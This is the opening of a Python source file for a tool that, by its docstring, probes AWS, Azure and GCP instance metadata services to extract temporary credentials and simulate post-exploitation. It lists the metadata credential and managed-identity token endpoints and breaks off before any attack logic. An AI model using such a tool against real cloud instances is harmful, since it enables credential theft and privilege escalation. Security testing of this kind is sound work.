import requests
import json
import time
import logging
import hmac
import hashlib
import datetime
import sys
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AutomatedCloudMetadataServiceExploitationSimulator:
    """
    A tool that automatically probes cloud instance metadata services (IMDS) on AWS,
    Azure, and GCP to detect misconfigurations, extract temporary credentials, and
    simulate post-exploitation attacks.

    This class validates whether VM instances are vulnerable to credential theft and
    privilege escalation via metadata service abuse.
    """

    # AWS endpoints
    AWS_IMDS_ENDPOINT = "http://169.254.169.254"
    AWS_TOKEN_PATH = "/latest/api/token"
    AWS_META_PATH = "/latest/meta-data"
    AWS_ROLES_PATH = "/latest/meta-data/iam/security-credentials/"
    AWS_CRED_PATH = "/latest/meta-data/iam/security-credentials/{role}"

    # Azure IMDS endpoints
    AZURE_IMDS_ENDPOINT = "http://169.254.169.254/metadata/instance"
    AZURE_TOKEN_ENDPOINT = (
        "http://169.254.169.254/metadata/identity/oauth2/token"
    )
    AZURE_MANAGEMENT_RESOURCE = "https://management.azure.com"

    # GCP metadata server
    GCP_METADATA_ENDP